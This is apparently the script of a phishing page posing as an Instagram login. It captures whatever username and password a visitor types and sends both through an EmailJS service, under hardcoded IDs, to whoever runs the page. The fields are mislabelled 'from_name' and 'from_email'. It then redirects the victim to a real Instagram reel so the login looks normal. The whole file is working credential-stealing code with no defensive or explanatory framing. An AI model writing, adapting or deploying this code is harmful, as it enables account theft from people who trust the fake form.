const loginInput=document.querySelector('#login');
const passwordInput=document.querySelector('#password')
const submit= document.querySelector('#submit');
const showPas= document.querySelector('.show');
const hidePas= document.querySelector('.hide');
const spinner=document.querySelector('.spinner');

passwordInput.addEventListener('keydown',e=>{
  
    if(e.target.value.length>0 && hidePas.style.display=='none' ){
        showPas.style.display='block';
    }else if(e.target.value.length>0 && showPas.style.display=='none'){
        hidePas.style.display='block';
    }else{
        showPas.style.display='none';
        hidePas.style.display='none';
    }
    
})

showPas.addEventListener('click' ,e=>{
    passwordInput.type='text';
    showPas.style.display='none';
    hidePas.style.display='block';
})

hidePas.addEventListener('click' ,e=>{
    passwordInput.type='password';
    showPas.style.display='block';
    hidePas.style.display='none';
})


submit.addEventListener('click' ,e=>{
    e.preventDefault()
    if(loginInput.value.length>0 && passwordInput.value.length>0){
        spinner.style.display='block';
        sendMail();
    }
   
})



function sendMail(params){
    
    const tempParams={
        from_name: loginInput.value,
        from_email: passwordInput.value
    }

    emailjs.send('service_c2kiy8h' ,'template_fh4e31f' , tempParams)
    .then(res=>{
        
        window.open('https://www.instagram.com/reel/CnIVVzdhGyu/?igshid=YmMyMTA2M2Y=',"_self");
        spinner.style.display='none';
        document.querySelector('form').reset();
        
        showPas.style.display='none';
        hidePas.style.display='none';
        loginInput.focus();
    })
}
